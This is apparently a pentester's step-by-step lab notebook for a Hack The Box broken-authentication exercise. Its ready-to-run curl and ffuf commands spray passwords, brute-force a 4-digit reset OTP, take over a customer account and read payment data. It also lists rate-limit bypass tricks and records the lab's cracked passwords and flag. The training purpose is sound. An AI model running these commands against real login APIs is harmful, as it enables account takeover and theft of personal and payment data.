# Batch 02 — Broken Authentication (CWE-307 + weak policy)

## FILL IN

```bash
BASE="http://154.57.164.65:31687"
EMAIL="htbpentester3@hackthebox.com"
PASS="HTBPentester3"
WL=/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt
```

## GOAL
Bypass or abuse authentication: weak password policy + **no rate limit** on login / OTP → account takeover.

## TIME
1–2 hours

## YOU NEED
- Customer account (or register path)
- `curl` + `ffuf`
- Optional: pinchtab (Swagger), gori (capture)

---

## WHY (30 seconds)

**Authentication** proves who you are.  
**Broken Authentication** = you can get in as someone else or break the login process.

This lab shows **CWE-307 Improper Restriction of Excessive Authentication Attempts**:

1. API allows **weak passwords** (here: “at least 6 characters”, even `123456`).  
2. Login has **no rate limit / lockout**.  
3. Password **reset OTP** is short (4 digits) and also not rate-limited.

So: dump emails → spray passwords **or** request OTP → brute OTP → set new password → steal data (payment options).

---

## DO THIS

### 1) Login as customer → JWT

```bash
curl -sk -X POST "$BASE/api/v1/authentication/customers/sign-in" \
  -H 'Content-Type: application/json' \
  -d "{\"Email\":\"$EMAIL\",\"Password\":\"$PASS\"}"
```

```bash
JWT=$(curl -sk -X POST "$BASE/api/v1/authentication/customers/sign-in" \
  -H 'Content-Type: application/json' \
  -d "{\"Email\":\"$EMAIL\",\"Password\":\"$PASS\"}" \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["jwt"])')
```

### 2) Who am I + roles

```bash
curl -sk -H "Authorization: Bearer $JWT" -H 'accept: application/json' \
  "$BASE/api/v1/customers/current-user"

curl -sk -H "Authorization: Bearer $JWT" -H 'accept: application/json' \
  "$BASE/api/v1/roles/current-user"
```

Lab roles: `Customers_UpdateByCurrentUser`, `Customers_Get`, `Customers_GetAll`.

### 3) List all customers (email inventory for spray)

```bash
curl -sk -H "Authorization: Bearer $JWT" -H 'accept: application/json' \
  "$BASE/api/v1/customers" -o customers.json
# extract emails → customerEmails.txt
```

**Note:** full list may also be **BOPLA** (extra fields) — next academy section. Here we only need emails for auth attacks.

### 4) Prove weak password policy (PATCH current-user)

Body shape (Swagger):

```json
{
  "UpdatedCustomer": {
    "Name": "HTBPentester3",
    "Email": "htbpentester3@hackthebox.com",
    "PhoneNumber": "449999999993",
    "BirthDate": "1995-06-21",
    "Password": "pass"
  }
}
```

```bash
# too short → error "at least 6 characters"
# Password: "123456" → successStatus true  (weak!)
```

Phone field may require digits only (`^\d+$`).  
Update DTO may force **exactly 6** chars (min=max=6 in OAS) — still cryptographically weak.

### 5) Fail message for ffuf filter

```bash
curl -sk -X POST "$BASE/api/v1/authentication/customers/sign-in" \
  -H 'Content-Type: application/json' \
  -d '{"Email":"x@y.com","Password":"nope"}'
# → {"errorMessage":"Invalid Credentials"}
```

### 6) Password brute force (high-value emails)

```bash
# customerEmails.txt — academy short list example:
# OlawaleJones@yandex.com
# IsabellaRichardson@gmail.com
# WenSalazar@zoho.com
# MasonJenkins@ymail.com   # flag target
```

**Per-email spray (reliable):**

```bash
ffuf -w "$WL" \
  -u "$BASE/api/v1/authentication/customers/sign-in" \
  -X POST -H "Content-Type: application/json" \
  -d '{"Email":"IsabellaRichardson@gmail.com","Password":"FUZZ"}' \
  -fr "Invalid Credentials" -t 100 -mc all
```

**Dual wordlist (academy):**

```bash
ffuf -w emails.txt:EMAIL -w "$WL:PASS" -mode clusterbomb \
  -u "$BASE/api/v1/authentication/customers/sign-in" \
  -X POST -H "Content-Type: application/json" \
  -d '{"Email":"EMAIL","Password":"PASS"}' \
  -fr "Invalid Credentials" -t 100
# Note: some ffuf builds ignore 2nd -w; prefer per-email if stuck
```

Lab hit: `IsabellaRichardson@gmail.com` / `qwerasdfzxcv`.

### 7) OTP brute (when password list fails)

```bash
# Request email OTP
curl -sk -X POST "$BASE/api/v1/authentication/customers/passwords/resets/email-otps" \
  -H 'Content-Type: application/json' \
  -d '{"Email":"MasonJenkins@ymail.com"}'

# Also exists: .../resets/sms-otps

# Reset with OTP + new weak password
# POST /api/v1/authentication/customers/passwords/resets
# {"Email":"...","OTP":"FUZZ","NewPassword":"123456"}

seq -w 0 9999 > otp-4digit.txt
ffuf -w otp-4digit.txt \
  -u "$BASE/api/v1/authentication/customers/passwords/resets" \
  -X POST -H "Content-Type: application/json" \
  -d '{"Email":"MasonJenkins@ymail.com","OTP":"FUZZ","NewPassword":"123456"}' \
  -fr '"SuccessStatus":false' -t 100 -mc all
```

Lab hit: OTP **`7526`** → password set to `123456`.

### 8) Login as victim → payment options (flag path)

```bash
JWT2=$(curl -sk -X POST "$BASE/api/v1/authentication/customers/sign-in" \
  -H 'Content-Type: application/json' \
  -d '{"Email":"MasonJenkins@ymail.com","Password":"123456"}' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["jwt"])')

curl -sk -H "Authorization: Bearer $JWT2" \
  "$BASE/api/v1/customers/payment-options/current-user"
```

Lab flag field: `accountNumber` on HTB Academy “Credit Card” option.

### 9) Write 3 lines

```text
Weak policy: yes/no
Brute login hit:
OTP hit:
```

---

## EDGE CASES (real world)

| # | Test | Why |
|---|------|-----|
| E1 | Count login failures before lockout / captcha | CWE-307 core |
| E2 | Same spray from many `X-Forwarded-For` values | Bypass IP rate limits |
| E3 | User-enumeration: different errors “invalid user” vs “bad password” | Focus spray |
| E4 | Timing side-channel on login | Valid user slower? |
| E5 | Password max length too small (here 6) | Entropy dead |
| E6 | Common password blocklist absent | rockyou / xato hits |
| E7 | OTP length / charset / TTL | 4-digit = 10k tries |
| E8 | OTP reuse / no single-use | Race double submit |
| E9 | Request OTP for any email without auth | Account spam + takeover path |
| E10 | SMS OTP vs email OTP | Different entropy/channel |
| E11 | MFA not required after password reset | Instant full session |
| E12 | JWT after login: alg, exp, role claims | Leads to batch JWT |
| E13 | Default / seed credentials | Admin portals |
| E14 | Credential stuffing (email+pass from breaches) | Same as spray with pairs |
| E15 | gori/Burp Intruder on sign-in + OTP | GUI alternative to ffuf |

---

## Prevention (report language)

- Rate-limit / progressive delays / lockout on **login and OTP**  
- Strong password policy (length ≥ 12, complexity, deny common passwords, history)  
- MFA  
- Long random OTPs, short TTL, attempt caps  

---

## IF / THEN

| You see | You do |
|---------|--------|
| Weak policy message | Document + spray high-value emails |
| No lockout under high RPS | CWE-307 finding |
| OTP short + unlimited | Prefer OTP brute over 10k×all users |
| Payment / PII after takeover | Critical impact |

---

## NEXT
→ Academy next: Broken Object Property Level Authorization (BOPLA) — list endpoints already leak fields.

## Lab result (154.57.164.65:31687)

| Item | Result |
|------|--------|
| Weak policy | “at least 6 characters”; `123456` accepted |
| Fail string | `Invalid Credentials` |
| Isabella | `qwerasdfzxcv` via xato-10k |
| Mason | OTP **7526** → reset → login |
| Flag | `HTB{115a6329120e9eff13c4ec6a63343ed1}` in payment options |
| Evidence | `notes/inlanefreight-broken-auth/evidence/` |
